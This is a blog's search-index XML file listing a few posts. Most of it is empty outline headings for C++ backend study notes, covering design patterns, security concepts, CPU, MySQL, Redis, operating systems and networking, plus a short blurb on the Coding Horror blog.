<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ics2022</title>
      <link href="/2023/09/21/ics2022/"/>
      <url>/2023/09/21/ics2022/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>awesome resources</title>
      <link href="/2023/05/07/awesome-resources/"/>
      <url>/2023/05/07/awesome-resources/</url>
      
        <content type="html"><![CDATA[<p>Coding Horror ，这是杰夫·阿特伍德（Jeff Atwood）于 2004 年创办的博客，记录其在软件开发经历中的所思所想、点点滴滴。时至今日，该博客每天都有近 10 万人次的访问量，读者纷纷参与评论，各种观点与智慧在这里不断地激情碰撞。其博文选集在中国被翻译成《高效能程序员的修练》，在豆瓣上有 8.3 的高分。2008 年，他和 Joel Spolsky 联合创办了 StackOverflow 问答网站，为程序员在开发软件时节省了非常多的时间，并开启了“StackOverflow Copy + Paste 式编程”。</p>]]></content>
      
      
      <categories>
          
          <category> resource </category>
          
      </categories>
      
      
        <tags>
            
            <tag> resource </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++后端开发(拓展篇)</title>
      <link href="/2023/04/29/c-hou-duan-kai-fa-tuo-zhan-pian/"/>
      <url>/2023/04/29/c-hou-duan-kai-fa-tuo-zhan-pian/</url>
      
        <content type="html"><![CDATA[<h2 id="1-设计模式"><a href="#1-设计模式" class="headerlink" title="1.设计模式"></a>1.设计模式</h2><h3 id="1-1-单例模式"><a href="#1-1-单例模式" class="headerlink" title="1.1 单例模式"></a>1.1 单例模式</h3><h3 id="1-2-工厂模式"><a href="#1-2-工厂模式" class="headerlink" title="1.2 工厂模式"></a>1.2 工厂模式</h3><h3 id="1-3-代理模式"><a href="#1-3-代理模式" class="headerlink" title="1.3 代理模式"></a>1.3 代理模式</h3><h3 id="1-4-观察者模式"><a href="#1-4-观察者模式" class="headerlink" title="1.4 观察者模式"></a>1.4 观察者模式</h3><h3 id="1-5-适配器模式"><a href="#1-5-适配器模式" class="headerlink" title="1.5 适配器模式"></a>1.5 适配器模式</h3><h3 id="1-6-桥接模式"><a href="#1-6-桥接模式" class="headerlink" title="1.6 桥接模式"></a>1.6 桥接模式</h3><h3 id="1-7-责任链模式"><a href="#1-7-责任链模式" class="headerlink" title="1.7 责任链模式"></a>1.7 责任链模式</h3><h2 id="2-网络安全"><a href="#2-网络安全" class="headerlink" title="2.网络安全"></a>2.网络安全</h2><h3 id="2-1软件安全"><a href="#2-1软件安全" class="headerlink" title="2.1软件安全"></a>2.1软件安全</h3><h4 id="2-1-1-缓冲区溢出"><a href="#2-1-1-缓冲区溢出" class="headerlink" title="2.1.1 缓冲区溢出"></a>2.1.1 缓冲区溢出</h4><h4 id="2-1-2-释放后使用"><a href="#2-1-2-释放后使用" class="headerlink" title="2.1.2 释放后使用"></a>2.1.2 释放后使用</h4><h4 id="2-1-3-空指针攻击"><a href="#2-1-3-空指针攻击" class="headerlink" title="2.1.3 空指针攻击"></a>2.1.3 空指针攻击</h4><h4 id="2-1-4-悬空指针和野指针"><a href="#2-1-4-悬空指针和野指针" class="headerlink" title="2.1.4 悬空指针和野指针"></a>2.1.4 悬空指针和野指针</h4><h3 id="2-2-网络安全"><a href="#2-2-网络安全" class="headerlink" title="2.2 网络安全"></a>2.2 网络安全</h3><h4 id="2-2-1-信息摘要"><a href="#2-2-1-信息摘要" class="headerlink" title="2.2.1 信息摘要"></a>2.2.1 信息摘要</h4><p>MD5</p><p>SHA1</p><p>SHA256</p><h4 id="2-2-2-加密算法"><a href="#2-2-2-加密算法" class="headerlink" title="2.2.2 加密算法"></a>2.2.2 加密算法</h4><h5 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h5><p>AES</p><p>DES</p><p>RC4</p><h5 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h5><h6 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h6><h6 id="DH"><a href="#DH" class="headerlink" title="DH"></a>DH</h6><h4 id="2-3-数字签名"><a href="#2-3-数字签名" class="headerlink" title="2.3 数字签名"></a>2.3 数字签名</h4><h2 id="3-计算机底层技术"><a href="#3-计算机底层技术" class="headerlink" title="3.计算机底层技术"></a>3.计算机底层技术</h2><h3 id="3-1-CPU"><a href="#3-1-CPU" class="headerlink" title="3.1 CPU"></a>3.1 CPU</h3><h4 id="3-1-1-寄存器"><a href="#3-1-1-寄存器" class="headerlink" title="3.1.1 寄存器"></a>3.1.1 寄存器</h4><h4 id="3-1-2-特权级"><a href="#3-1-2-特权级" class="headerlink" title="3.1.2 特权级"></a>3.1.2 特权级</h4><h4 id="3-1-3-缓存技术"><a href="#3-1-3-缓存技术" class="headerlink" title="3.1.3 缓存技术"></a>3.1.3 缓存技术</h4><h4 id="3-1-4-缓存一致性原理"><a href="#3-1-4-缓存一致性原理" class="headerlink" title="3.1.4 缓存一致性原理"></a>3.1.4 缓存一致性原理</h4><h4 id="3-1-5-分支预测-amp-乱序执行"><a href="#3-1-5-分支预测-amp-乱序执行" class="headerlink" title="3.1.5 分支预测&amp;乱序执行"></a>3.1.5 分支预测&amp;乱序执行</h4><h4 id="3-1-6-中断与异常"><a href="#3-1-6-中断与异常" class="headerlink" title="3.1.6 中断与异常"></a>3.1.6 中断与异常</h4><h4 id="3-1-7-内存管理"><a href="#3-1-7-内存管理" class="headerlink" title="3.1.7 内存管理"></a>3.1.7 内存管理</h4><h4 id="3-1-8-多核技术"><a href="#3-1-8-多核技术" class="headerlink" title="3.1.8 多核技术"></a>3.1.8 多核技术</h4><h4 id="3-1-9-线程亲和性"><a href="#3-1-9-线程亲和性" class="headerlink" title="3.1.9 线程亲和性"></a>3.1.9 线程亲和性</h4><h4 id="3-1-10-NUMA架构"><a href="#3-1-10-NUMA架构" class="headerlink" title="3.1.10 NUMA架构"></a>3.1.10 NUMA架构</h4><h4 id="3-1-11-超线程技术"><a href="#3-1-11-超线程技术" class="headerlink" title="3.1.11 超线程技术"></a>3.1.11 超线程技术</h4><h3 id="3-2-文件管理原理"><a href="#3-2-文件管理原理" class="headerlink" title="3.2 文件管理原理"></a>3.2 文件管理原理</h3><h4 id="3-2-1-VFS"><a href="#3-2-1-VFS" class="headerlink" title="3.2.1 VFS"></a>3.2.1 VFS</h4><h4 id="3-2-2-EXT"><a href="#3-2-2-EXT" class="headerlink" title="3.2.2 EXT"></a>3.2.2 EXT</h4><h4 id="3-2-3-XFS"><a href="#3-2-3-XFS" class="headerlink" title="3.2.3 XFS"></a>3.2.3 XFS</h4><h3 id="3-3-IO"><a href="#3-3-IO" class="headerlink" title="3.3 IO"></a>3.3 IO</h3><h4 id="3-3-1-PIO"><a href="#3-3-1-PIO" class="headerlink" title="3.3.1 PIO"></a>3.3.1 PIO</h4><h4 id="3-3-2-DMA"><a href="#3-3-2-DMA" class="headerlink" title="3.3.2 DMA"></a>3.3.2 DMA</h4><h4 id="3-3-3-零拷贝技术"><a href="#3-3-3-零拷贝技术" class="headerlink" title="3.3.3 零拷贝技术"></a>3.3.3 零拷贝技术</h4><h2 id="4-MySQL"><a href="#4-MySQL" class="headerlink" title="4.MySQL"></a>4.MySQL</h2><h3 id="4-1-索引原理"><a href="#4-1-索引原理" class="headerlink" title="4.1 索引原理"></a>4.1 索引原理</h3><h4 id="4-1-1-主键索引和非主键索引"><a href="#4-1-1-主键索引和非主键索引" class="headerlink" title="4.1.1 主键索引和非主键索引"></a>4.1.1 主键索引和非主键索引</h4><h4 id="4-1-2-B-数索引"><a href="#4-1-2-B-数索引" class="headerlink" title="4.1.2  B+数索引"></a>4.1.2  B+数索引</h4><h4 id="4-1-3-数列表索引"><a href="#4-1-3-数列表索引" class="headerlink" title="4.1.3 数列表索引"></a>4.1.3 数列表索引</h4><h4 id="4-1-4-位图索引"><a href="#4-1-4-位图索引" class="headerlink" title="4.1.4 位图索引"></a>4.1.4 位图索引</h4><h3 id="4-2-事务"><a href="#4-2-事务" class="headerlink" title="4.2 事务"></a>4.2 事务</h3><h4 id="4-2-1-ACID"><a href="#4-2-1-ACID" class="headerlink" title="4.2.1 ACID"></a>4.2.1 ACID</h4><h4 id="4-2-2-脏读"><a href="#4-2-2-脏读" class="headerlink" title="4.2.2 脏读"></a>4.2.2 脏读</h4><h4 id="4-2-3-幻读"><a href="#4-2-3-幻读" class="headerlink" title="4.2.3 幻读"></a>4.2.3 幻读</h4><h4 id="4-2-4-不可重复读"><a href="#4-2-4-不可重复读" class="headerlink" title="4.2.4 不可重复读"></a>4.2.4 不可重复读</h4><h4 id="4-2-5-丢失修改"><a href="#4-2-5-丢失修改" class="headerlink" title="4.2.5 丢失修改"></a>4.2.5 丢失修改</h4><h3 id="4-3-锁"><a href="#4-3-锁" class="headerlink" title="4.3 锁"></a>4.3 锁</h3><h4 id="4-3-1-表锁"><a href="#4-3-1-表锁" class="headerlink" title="4.3.1 表锁"></a>4.3.1 表锁</h4><h4 id="4-3-2-行锁"><a href="#4-3-2-行锁" class="headerlink" title="4.3.2 行锁"></a>4.3.2 行锁</h4><h4 id="4-3-3-乐观锁-x2F-悲观锁"><a href="#4-3-3-乐观锁-x2F-悲观锁" class="headerlink" title="4.3.3 乐观锁&#x2F;悲观锁"></a>4.3.3 乐观锁&#x2F;悲观锁</h4><h3 id="4-4-日志"><a href="#4-4-日志" class="headerlink" title="4.4 日志"></a>4.4 日志</h3><h4 id="4-4-1-查询日志"><a href="#4-4-1-查询日志" class="headerlink" title="4.4.1 查询日志"></a>4.4.1 查询日志</h4><h4 id="4-4-2-binlog"><a href="#4-4-2-binlog" class="headerlink" title="4.4.2 binlog"></a>4.4.2 binlog</h4><h4 id="4-4-3-redo-log"><a href="#4-4-3-redo-log" class="headerlink" title="4.4.3 redo log"></a>4.4.3 redo log</h4><h4 id="4-4-4-undo-log"><a href="#4-4-4-undo-log" class="headerlink" title="4.4.4 undo log"></a>4.4.4 undo log</h4><h3 id="4-5-主从模式"><a href="#4-5-主从模式" class="headerlink" title="4.5 主从模式"></a>4.5 主从模式</h3><h2 id="5-Redis"><a href="#5-Redis" class="headerlink" title="5. Redis"></a>5. Redis</h2><h3 id="5-1-数据结构"><a href="#5-1-数据结构" class="headerlink" title="5.1 数据结构"></a>5.1 数据结构</h3><h3 id="5-2-缓存基础"><a href="#5-2-缓存基础" class="headerlink" title="5.2 缓存基础"></a>5.2 缓存基础</h3><h4 id="5-2-1-缓存穿透"><a href="#5-2-1-缓存穿透" class="headerlink" title="5.2.1 缓存穿透"></a>5.2.1 缓存穿透</h4><h4 id="5-2-2-缓存击穿"><a href="#5-2-2-缓存击穿" class="headerlink" title="5.2.2 缓存击穿"></a>5.2.2 缓存击穿</h4><h4 id="5-2-3-缓存雪崩"><a href="#5-2-3-缓存雪崩" class="headerlink" title="5.2.3 缓存雪崩"></a>5.2.3 缓存雪崩</h4><h4 id="5-2-4-缓存过期淘汰"><a href="#5-2-4-缓存过期淘汰" class="headerlink" title="5.2.4 缓存过期淘汰"></a>5.2.4 缓存过期淘汰</h4><h3 id="5-3-持久化"><a href="#5-3-持久化" class="headerlink" title="5.3 持久化"></a>5.3 持久化</h3><h4 id="5-3-1-RDB"><a href="#5-3-1-RDB" class="headerlink" title="5.3.1 RDB"></a>5.3.1 RDB</h4><h4 id="5-3-2-AOF"><a href="#5-3-2-AOF" class="headerlink" title="5.3.2 AOF"></a>5.3.2 AOF</h4><h3 id="5-4-高可用"><a href="#5-4-高可用" class="headerlink" title="5.4 高可用"></a>5.4 高可用</h3><h4 id="5-4-1-哨兵"><a href="#5-4-1-哨兵" class="headerlink" title="5.4.1 哨兵"></a>5.4.1 哨兵</h4><h4 id="5-4-2-选举机制"><a href="#5-4-2-选举机制" class="headerlink" title="5.4.2 选举机制"></a>5.4.2 选举机制</h4><h3 id="5-5-集群"><a href="#5-5-集群" class="headerlink" title="5.5 集群"></a>5.5 集群</h3><h2 id="6-其他第三方软件"><a href="#6-其他第三方软件" class="headerlink" title="6. 其他第三方软件"></a>6. 其他第三方软件</h2><h3 id="6-1-nginx"><a href="#6-1-nginx" class="headerlink" title="6.1 nginx"></a>6.1 nginx</h3><h3 id="6-2-docker"><a href="#6-2-docker" class="headerlink" title="6.2 docker"></a>6.2 docker</h3><h3 id="6-3-elasticsearch"><a href="#6-3-elasticsearch" class="headerlink" title="6.3 elasticsearch"></a>6.3 elasticsearch</h3><h3 id="6-4-RabbitMQ"><a href="#6-4-RabbitMQ" class="headerlink" title="6.4 RabbitMQ"></a>6.4 RabbitMQ</h3><h3 id="6-5-KafKa"><a href="#6-5-KafKa" class="headerlink" title="6.5 KafKa"></a>6.5 KafKa</h3>]]></content>
      
      
      <categories>
          
          <category> C++后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> 设计模式 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> CPU </tag>
            
            <tag> IO </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++后端开发(进阶篇)</title>
      <link href="/2023/04/29/c-hou-duan-kai-fa-jin-jie-pian/"/>
      <url>/2023/04/29/c-hou-duan-kai-fa-jin-jie-pian/</url>
      
        <content type="html"><![CDATA[<h2 id="1-操作系统基础"><a href="#1-操作系统基础" class="headerlink" title="1.操作系统基础"></a>1.操作系统基础</h2><h3 id="1-1进程与线程"><a href="#1-1进程与线程" class="headerlink" title="1.1进程与线程"></a>1.1进程与线程</h3><h3 id="1-2进程地址空间布局"><a href="#1-2进程地址空间布局" class="headerlink" title="1.2进程地址空间布局"></a>1.2进程地址空间布局</h3><h3 id="1-3虚拟内存"><a href="#1-3虚拟内存" class="headerlink" title="1.3虚拟内存"></a>1.3虚拟内存</h3><h3 id="1-4内核态与用户态"><a href="#1-4内核态与用户态" class="headerlink" title="1.4内核态与用户态"></a>1.4内核态与用户态</h3><h3 id="1-5系统调用"><a href="#1-5系统调用" class="headerlink" title="1.5系统调用"></a>1.5系统调用</h3><h3 id="1-6中断与异常"><a href="#1-6中断与异常" class="headerlink" title="1.6中断与异常"></a>1.6中断与异常</h3><h2 id="2-C-进阶"><a href="#2-C-进阶" class="headerlink" title="2.C++进阶"></a>2.C++进阶</h2><h3 id="2-1异常处理"><a href="#2-1异常处理" class="headerlink" title="2.1异常处理"></a>2.1异常处理</h3><h3 id="2-2泛型编程"><a href="#2-2泛型编程" class="headerlink" title="2.2泛型编程"></a>2.2泛型编程</h3><h3 id="2-3内存对象模型"><a href="#2-3内存对象模型" class="headerlink" title="2.3内存对象模型"></a>2.3内存对象模型</h3><h3 id="2-4RTTI"><a href="#2-4RTTI" class="headerlink" title="2.4RTTI"></a>2.4RTTI</h3><h3 id="2-5多态实现原理"><a href="#2-5多态实现原理" class="headerlink" title="2.5多态实现原理"></a>2.5多态实现原理</h3><h3 id="2-6四大类型转换"><a href="#2-6四大类型转换" class="headerlink" title="2.6四大类型转换"></a>2.6四大类型转换</h3><h4 id="2-6-1-static-cast"><a href="#2-6-1-static-cast" class="headerlink" title="2.6.1 static_cast"></a>2.6.1 static_cast</h4><h4 id="2-6-2-const-cast"><a href="#2-6-2-const-cast" class="headerlink" title="2.6.2 const_cast"></a>2.6.2 const_cast</h4><h4 id="2-6-3-dynamic-cast"><a href="#2-6-3-dynamic-cast" class="headerlink" title="2.6.3 dynamic_cast"></a>2.6.3 dynamic_cast</h4><h4 id="2-6-4-reinterpret-cast"><a href="#2-6-4-reinterpret-cast" class="headerlink" title="2.6.4 reinterpret_cast"></a>2.6.4 reinterpret_cast</h4><h3 id="2-7-C-11"><a href="#2-7-C-11" class="headerlink" title="2.7 C++11"></a>2.7 C++11</h3><h4 id="2-7-1-右值引用"><a href="#2-7-1-右值引用" class="headerlink" title="2.7.1 右值引用"></a>2.7.1 右值引用</h4><h4 id="2-7-2-自动类型推导"><a href="#2-7-2-自动类型推导" class="headerlink" title="2.7.2 自动类型推导"></a>2.7.2 自动类型推导</h4><h4 id="2-7-3-unordered-map"><a href="#2-7-3-unordered-map" class="headerlink" title="2.7.3 unordered_map"></a>2.7.3 unordered_map</h4><h4 id="2-7-4-thread"><a href="#2-7-4-thread" class="headerlink" title="2.7.4 thread"></a>2.7.4 thread</h4><h4 id="2-7-5-lambda"><a href="#2-7-5-lambda" class="headerlink" title="2.7.5 lambda"></a>2.7.5 lambda</h4><h4 id="2-7-6-for-each"><a href="#2-7-6-for-each" class="headerlink" title="2.7.6 for each"></a>2.7.6 for each</h4><h4 id="2-7-7-智能指针"><a href="#2-7-7-智能指针" class="headerlink" title="2.7.7 智能指针"></a>2.7.7 智能指针</h4><h2 id="3-线程堆栈"><a href="#3-线程堆栈" class="headerlink" title="3.线程堆栈"></a>3.线程堆栈</h2><h2 id="4-调试技术"><a href="#4-调试技术" class="headerlink" title="4.调试技术"></a>4.调试技术</h2><h2 id="5-数据结构与算法进阶"><a href="#5-数据结构与算法进阶" class="headerlink" title="5.数据结构与算法进阶"></a>5.数据结构与算法进阶</h2><h2 id="6-网络编程"><a href="#6-网络编程" class="headerlink" title="6.网络编程"></a>6.网络编程</h2><h2 id="7-多进程多线程编程"><a href="#7-多进程多线程编程" class="headerlink" title="7.多进程多线程编程"></a>7.多进程多线程编程</h2><h2 id="8-进程间通信"><a href="#8-进程间通信" class="headerlink" title="8.进程间通信"></a>8.进程间通信</h2><h2 id="9-RPC与反序列化技术"><a href="#9-RPC与反序列化技术" class="headerlink" title="9.RPC与反序列化技术"></a>9.RPC与反序列化技术</h2><h2 id="10-计算机网络进阶"><a href="#10-计算机网络进阶" class="headerlink" title="10.计算机网络进阶"></a>10.计算机网络进阶</h2>]]></content>
      
      
      <categories>
          
          <category> C++后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
            <tag> 数据结构和算法 </tag>
            
            <tag> OS </tag>
            
            <tag> C++ </tag>
            
            <tag> debug </tag>
            
            <tag> 网络编程 </tag>
            
            <tag> 进程/线程 </tag>
            
            <tag> RPC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++后端开发(基础篇)</title>
      <link href="/2023/04/29/c-hou-duan-kai-fa-ji-chu-pian/"/>
      <url>/2023/04/29/c-hou-duan-kai-fa-ji-chu-pian/</url>
      
        <content type="html"><![CDATA[<h2 id="1-计算机体系架构基础"><a href="#1-计算机体系架构基础" class="headerlink" title="1.计算机体系架构基础"></a>1.计算机体系架构基础</h2><h3 id="1-1-图灵机"><a href="#1-1-图灵机" class="headerlink" title="1.1 图灵机"></a>1.1 图灵机</h3><h3 id="1-2-冯诺依曼体系架构"><a href="#1-2-冯诺依曼体系架构" class="headerlink" title="1.2 冯诺依曼体系架构"></a>1.2 冯诺依曼体系架构</h3><h3 id="1-3-计算机总线"><a href="#1-3-计算机总线" class="headerlink" title="1.3 计算机总线"></a>1.3 计算机总线</h3><h3 id="1-4-计算机信息表示与存储"><a href="#1-4-计算机信息表示与存储" class="headerlink" title="1.4 计算机信息表示与存储"></a>1.4 计算机信息表示与存储</h3><h3 id="1-5-整数"><a href="#1-5-整数" class="headerlink" title="1.5 整数"></a>1.5 整数</h3><h4 id="1-5-1-符号数-x2F-无符号数"><a href="#1-5-1-符号数-x2F-无符号数" class="headerlink" title="1.5.1 符号数&#x2F;无符号数"></a>1.5.1 符号数&#x2F;无符号数</h4><h4 id="1-5-2-整数运算"><a href="#1-5-2-整数运算" class="headerlink" title="1.5.2 整数运算"></a>1.5.2 整数运算</h4><h3 id="1-6-CPU与指令集"><a href="#1-6-CPU与指令集" class="headerlink" title="1.6 CPU与指令集"></a>1.6 CPU与指令集</h3><h4 id="1-6-1-x86与CISC"><a href="#1-6-1-x86与CISC" class="headerlink" title="1.6.1 x86与CISC"></a>1.6.1 x86与CISC</h4><h4 id="1-6-2-arm与RISC"><a href="#1-6-2-arm与RISC" class="headerlink" title="1.6.2 arm与RISC"></a>1.6.2 arm与RISC</h4><h3 id="1-7-程序基础概念"><a href="#1-7-程序基础概念" class="headerlink" title="1.7 程序基础概念"></a>1.7 程序基础概念</h3><h3 id="1-8-编程语言"><a href="#1-8-编程语言" class="headerlink" title="1.8 编程语言"></a>1.8 编程语言</h3><h4 id="1-8-1-机器语言"><a href="#1-8-1-机器语言" class="headerlink" title="1.8.1 机器语言"></a>1.8.1 机器语言</h4><h4 id="1-8-2-汇编语言"><a href="#1-8-2-汇编语言" class="headerlink" title="1.8.2 汇编语言"></a>1.8.2 汇编语言</h4><h4 id="1-8-3-编译型语言：C-x2F-C"><a href="#1-8-3-编译型语言：C-x2F-C" class="headerlink" title="1.8.3 编译型语言：C&#x2F;C++"></a>1.8.3 编译型语言：C&#x2F;C++</h4><h4 id="1-8-4-中间码语言：Java-x2F-C"><a href="#1-8-4-中间码语言：Java-x2F-C" class="headerlink" title="1.8.4 中间码语言：Java&#x2F;C#"></a>1.8.4 中间码语言：Java&#x2F;C#</h4><h4 id="1-8-5-解释型语言：JS-x2F-python"><a href="#1-8-5-解释型语言：JS-x2F-python" class="headerlink" title="1.8.5 解释型语言：JS&#x2F;python"></a>1.8.5 解释型语言：JS&#x2F;python</h4><h2 id="2-Linux基础"><a href="#2-Linux基础" class="headerlink" title="2.Linux基础"></a>2.Linux基础</h2><h3 id="2-1-权限管理"><a href="#2-1-权限管理" class="headerlink" title="2.1 权限管理"></a>2.1 权限管理</h3><h3 id="2-2-常用命令"><a href="#2-2-常用命令" class="headerlink" title="2.2 常用命令"></a>2.2 常用命令</h3><h4 id="2-2-1-文件相关"><a href="#2-2-1-文件相关" class="headerlink" title="2.2.1 文件相关"></a>2.2.1 文件相关</h4><h4 id="2-2-2-用户相关"><a href="#2-2-2-用户相关" class="headerlink" title="2.2.2 用户相关"></a>2.2.2 用户相关</h4><h4 id="2-2-3-磁盘相关"><a href="#2-2-3-磁盘相关" class="headerlink" title="2.2.3 磁盘相关"></a>2.2.3 磁盘相关</h4><h4 id="2-2-4-网络相关"><a href="#2-2-4-网络相关" class="headerlink" title="2.2.4 网络相关"></a>2.2.4 网络相关</h4><h4 id="2-2-5-进程相关"><a href="#2-2-5-进程相关" class="headerlink" title="2.2.5 进程相关"></a>2.2.5 进程相关</h4><h3 id="2-3-shell脚本"><a href="#2-3-shell脚本" class="headerlink" title="2.3 shell脚本"></a>2.3 shell脚本</h3><h2 id="3-C语言基础"><a href="#3-C语言基础" class="headerlink" title="3.C语言基础"></a>3.C语言基础</h2><h3 id="3-1-宏"><a href="#3-1-宏" class="headerlink" title="3.1 宏"></a>3.1 宏</h3><h3 id="3-2数据类型"><a href="#3-2数据类型" class="headerlink" title="3.2数据类型"></a>3.2数据类型</h3><h3 id="3-3-数据运算"><a href="#3-3-数据运算" class="headerlink" title="3.3 数据运算"></a>3.3 数据运算</h3><h3 id="3-4-数组"><a href="#3-4-数组" class="headerlink" title="3.4 数组"></a>3.4 数组</h3><h3 id="3-5-输入输出"><a href="#3-5-输入输出" class="headerlink" title="3.5 输入输出"></a>3.5 输入输出</h3><h3 id="3-6-分枝与循环"><a href="#3-6-分枝与循环" class="headerlink" title="3.6 分枝与循环"></a>3.6 分枝与循环</h3><h3 id="3-7-指针"><a href="#3-7-指针" class="headerlink" title="3.7 指针"></a>3.7 指针</h3><h3 id="3-8-结构体-x2F-联合体-x2F-枚举"><a href="#3-8-结构体-x2F-联合体-x2F-枚举" class="headerlink" title="3.8 结构体&#x2F;联合体&#x2F;枚举"></a>3.8 结构体&#x2F;联合体&#x2F;枚举</h3><h3 id="3-9-函数"><a href="#3-9-函数" class="headerlink" title="3.9 函数"></a>3.9 函数</h3><h3 id="3-10-sizeof"><a href="#3-10-sizeof" class="headerlink" title="3.10 sizeof"></a>3.10 sizeof</h3><h3 id="3-11-文件操作"><a href="#3-11-文件操作" class="headerlink" title="3.11 文件操作"></a>3.11 文件操作</h3><h2 id="4-计算机网络基础"><a href="#4-计算机网络基础" class="headerlink" title="4.计算机网络基础"></a>4.计算机网络基础</h2><h3 id="4-1-局域网技术"><a href="#4-1-局域网技术" class="headerlink" title="4.1 局域网技术"></a>4.1 局域网技术</h3><h3 id="4-2-集线器-x2F-交换机-x2F-路由器"><a href="#4-2-集线器-x2F-交换机-x2F-路由器" class="headerlink" title="4.2 集线器&#x2F;交换机&#x2F;路由器"></a>4.2 集线器&#x2F;交换机&#x2F;路由器</h3><h3 id="4-3-OSI七层模型"><a href="#4-3-OSI七层模型" class="headerlink" title="4.3 OSI七层模型"></a>4.3 OSI七层模型</h3><h3 id="4-4-TCP-x2F-IP四层模型"><a href="#4-4-TCP-x2F-IP四层模型" class="headerlink" title="4.4 TCP&#x2F;IP四层模型"></a>4.4 TCP&#x2F;IP四层模型</h3><h3 id="4-5-IP协议"><a href="#4-5-IP协议" class="headerlink" title="4.5 IP协议"></a>4.5 IP协议</h3><h3 id="4-6-TCP-x2F-IP"><a href="#4-6-TCP-x2F-IP" class="headerlink" title="4.6 TCP&#x2F;IP"></a>4.6 TCP&#x2F;IP</h3><h3 id="4-7-DNS"><a href="#4-7-DNS" class="headerlink" title="4.7 DNS"></a>4.7 DNS</h3><h3 id="4-8-HTTP"><a href="#4-8-HTTP" class="headerlink" title="4.8 HTTP"></a>4.8 HTTP</h3><h2 id="5-C-基础"><a href="#5-C-基础" class="headerlink" title="5.C++基础"></a>5.C++基础</h2><h3 id="5-1面向对象基础"><a href="#5-1面向对象基础" class="headerlink" title="5.1面向对象基础"></a>5.1面向对象基础</h3><h4 id="5-1-1-继承"><a href="#5-1-1-继承" class="headerlink" title="5.1.1 继承"></a>5.1.1 继承</h4><h4 id="5-1-2-封装"><a href="#5-1-2-封装" class="headerlink" title="5.1.2 封装"></a>5.1.2 封装</h4><h4 id="5-1-3-多态"><a href="#5-1-3-多态" class="headerlink" title="5.1.3 多态"></a>5.1.3 多态</h4><h4 id="5-1-4-重载"><a href="#5-1-4-重载" class="headerlink" title="5.1.4 重载"></a>5.1.4 重载</h4><h3 id="5-2-友元"><a href="#5-2-友元" class="headerlink" title="5.2 友元"></a>5.2 友元</h3><h3 id="5-3-static-x2F-const"><a href="#5-3-static-x2F-const" class="headerlink" title="5.3 static&#x2F;const"></a>5.3 static&#x2F;const</h3><h3 id="5-4-虚函数"><a href="#5-4-虚函数" class="headerlink" title="5.4 虚函数"></a>5.4 虚函数</h3><h3 id="5-5-指针与引用"><a href="#5-5-指针与引用" class="headerlink" title="5.5 指针与引用"></a>5.5 指针与引用</h3><h3 id="5-6-RAll"><a href="#5-6-RAll" class="headerlink" title="5.6 RAll"></a>5.6 RAll</h3><h3 id="5-7-STL"><a href="#5-7-STL" class="headerlink" title="5.7 STL"></a>5.7 STL</h3><h4 id="5-7-1-vector"><a href="#5-7-1-vector" class="headerlink" title="5.7.1 vector"></a>5.7.1 vector</h4><h4 id="5-7-2-set"><a href="#5-7-2-set" class="headerlink" title="5.7.2 set"></a>5.7.2 set</h4><h4 id="5-7-3-map"><a href="#5-7-3-map" class="headerlink" title="5.7.3 map"></a>5.7.3 map</h4><h4 id="5-7-4-list"><a href="#5-7-4-list" class="headerlink" title="5.7.4 list"></a>5.7.4 list</h4><h4 id="5-7-5-stack"><a href="#5-7-5-stack" class="headerlink" title="5.7.5 stack"></a>5.7.5 stack</h4><h4 id="5-7-6-queue"><a href="#5-7-6-queue" class="headerlink" title="5.7.6 queue"></a>5.7.6 queue</h4><h2 id="6-数据结构和算法基础"><a href="#6-数据结构和算法基础" class="headerlink" title="6.数据结构和算法基础"></a>6.数据结构和算法基础</h2><h3 id="6-1-栈"><a href="#6-1-栈" class="headerlink" title="6.1 栈"></a>6.1 栈</h3><h3 id="6-2-队列"><a href="#6-2-队列" class="headerlink" title="6.2 队列"></a>6.2 队列</h3><h3 id="6-3-数-x2F-二叉树-x2F-二叉搜索树"><a href="#6-3-数-x2F-二叉树-x2F-二叉搜索树" class="headerlink" title="6.3 数&#x2F;二叉树&#x2F;二叉搜索树"></a>6.3 数&#x2F;二叉树&#x2F;二叉搜索树</h3><h3 id="6-4-链表-x2F-双向链表-x2F-交叉链表"><a href="#6-4-链表-x2F-双向链表-x2F-交叉链表" class="headerlink" title="6.4 链表&#x2F;双向链表&#x2F;交叉链表"></a>6.4 链表&#x2F;双向链表&#x2F;交叉链表</h3><h3 id="6-5-哈希表"><a href="#6-5-哈希表" class="headerlink" title="6.5 哈希表"></a>6.5 哈希表</h3><h3 id="6-6-十大排序算法"><a href="#6-6-十大排序算法" class="headerlink" title="6.6 十大排序算法"></a>6.6 十大排序算法</h3><h3 id="6-7-二分查找"><a href="#6-7-二分查找" class="headerlink" title="6.7 二分查找"></a>6.7 二分查找</h3><h2 id="7-编译原理"><a href="#7-编译原理" class="headerlink" title="7.编译原理"></a>7.编译原理</h2><h3 id="7-1-预编译指令"><a href="#7-1-预编译指令" class="headerlink" title="7.1 预编译指令"></a>7.1 预编译指令</h3><h3 id="7-2-预处理"><a href="#7-2-预处理" class="headerlink" title="7.2 预处理"></a>7.2 预处理</h3><h3 id="7-3-编译"><a href="#7-3-编译" class="headerlink" title="7.3 编译"></a>7.3 编译</h3><h3 id="7-4-链接"><a href="#7-4-链接" class="headerlink" title="7.4 链接"></a>7.4 链接</h3><h3 id="7-5-可执行文件"><a href="#7-5-可执行文件" class="headerlink" title="7.5 可执行文件"></a>7.5 可执行文件</h3><h3 id="7-6-makefile"><a href="#7-6-makefile" class="headerlink" title="7.6 makefile"></a>7.6 makefile</h3><h3 id="7-7-CMake"><a href="#7-7-CMake" class="headerlink" title="7.7 CMake"></a>7.7 CMake</h3><h3 id="7-8-GCC"><a href="#7-8-GCC" class="headerlink" title="7.8 GCC"></a>7.8 GCC</h3><h2 id="8-数据库基础"><a href="#8-数据库基础" class="headerlink" 